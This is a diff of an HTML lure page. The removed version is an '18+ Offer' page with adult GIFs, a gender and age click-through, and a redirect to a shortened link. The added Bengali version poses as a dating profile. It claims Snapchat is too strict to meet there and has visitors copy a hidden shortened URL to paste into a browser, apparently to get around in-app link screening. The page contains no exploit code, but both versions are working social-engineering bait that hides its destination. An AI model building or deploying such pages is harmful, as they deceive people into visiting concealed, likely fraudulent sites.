@@ -1,86 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>18+ Offer</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      color: white;
-      background: url('https://imagex1.sx.cdn.live/images/pinporn/2019/06/01/21247122.gif') no-repeat center center fixed;
-      background-size: cover;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      position: relative;
-    }
-    .overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: url('https://i.gifer.com/7efs.gif') no-repeat center center;
-      background-size: contain;
-      opacity: 0.6;
-      z-index: 0;
-    }
-    .container {
-      background-color: rgba(0, 0, 0, 0.7);
-      padding: 20px;
-      border-radius: 15px;
-      text-align: center;
-      max-width: 90%;
-      width: 400px;
-      z-index: 1;
-    }
-    button {
-      padding: 10px 20px;
-      margin-top: 15px;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      background-color: crimson;
-      color: white;
-      cursor: pointer;
-    }
-    .hidden {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ল্যান্ডিং পেজ</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .browsers {
+            margin: 20px 0;
+        }
+        .browsers img {
+            width: 50px;
+            margin: 10px;
+        }
+        .copy-btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .copy-btn:hover {
+            background-color: #45a049;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #aaa;
+        }
+    </style>
 </head>
 <body>
-  <div class="overlay"></div>
 
-  <div class="container" id="step1">
-    <h2>আপনার লিঙ্গ নির্বাচন করুন</h2>
-    <button onclick="nextStep('male')">পুরুষ</button>
-    <button onclick="nextStep('female')">মহিলা</button>
-  </div>
+    <h2>ওয়েলকাম টু মাই পার্সোনাল প্রোফাইল</h2>
+    <p>আমি মনে করি এখানে আমাদের দেখা করা সেফ না যেহেতু আমরা ডেটিং এ যাচ্ছি<br>
+    স্ন্যাপ চ্যাট এ বিষয়ে খুবই সতর্ক।<br>
+    নিচে <b>কপি নাও</b> বাটনে ক্লিক করে আমার এড্রেসটি কপি করে আপনার ফোনে থাকা যেকোনো ব্রাউজারে পেস্ট করুন এবং আমাকে খুঁজে পান।</p>
 
-  <div class="container hidden" id="step2">
-    <h2>আপনি কি ১৮+?</h2>
-    <button onclick="nextStep2()">হ্যাঁ</button>
-  </div>
+    <div class="browsers">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Microsoft_Edge_logo_%282019%29.svg" alt="Edge">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Google_Chrome_icon_%282011%29.png" alt="Chrome">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/52/Safari_browser_logo.svg" alt="Safari">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4c/Opera_2015_icon.svg" alt="Opera">
+    </div>
 
-  <div class="container hidden" id="step3">
-    <h2>Shohan</h2>
-    <button onclick="window.location.href='https://rb.gy/bda62y'">START</button>
-  </div>
+    <button class="copy-btn" onclick="copyText()">কপি নাও</button>
 
-  <script>
-    function nextStep(gender) {
-      document.getElementById('step1').classList.add('hidden');
-      document.getElementById('step2').classList.remove('hidden');
-    }
-    function nextStep2() {
-      document.getElementById('step2').classList.add('hidden');
-      document.getElementById('step3').classList.remove('hidden');
-    }
-  </script>
+    <p class="footer">আপনি যেকোনো ব্রাউজার ব্যবহার করতে পারেন</p>
+
+    <script>
+        function copyText() {
+            const textToCopy = "https://shorturl.at/uVfTK";
+            const tempInput = document.createElement("input");
+            tempInput.value = textToCopy;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            alert("লিংক কপি হয়েছে! এখন আপনার ব্রাউজারে পেস্ট করুন।");
+        }
+    </script>
+
 </body>
 </html>
